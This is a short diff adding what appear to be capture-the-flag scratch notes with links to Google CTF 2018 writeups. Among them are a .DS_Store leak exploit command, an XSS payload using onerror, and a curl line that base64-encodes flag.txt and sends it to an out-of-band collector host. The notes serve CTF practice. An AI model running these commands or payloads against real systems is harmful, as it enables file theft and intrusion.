@@ -1,0 +1,13 @@
+https://github.com/lijiejie/ds_store_exp
+python ds_store_exp http://ctf2.linkedyx.cmL10882/.DS_Story
+php_mt_seed
+<img type=image src=x onerror=prompt(1)>
+curl http://x2wugy.ceye.io/?$(cat flag.txt|base64)&exec=1
+原题：https://ctftime.org/writeup/10369
+
+
+
+同年Google CTF另外的几个题目：
+
+https://otakekumi.github.io/2018/07/04/GoogleCTF-2018-Writeup-JsSafe-Translate-catChat-gCalc/
+
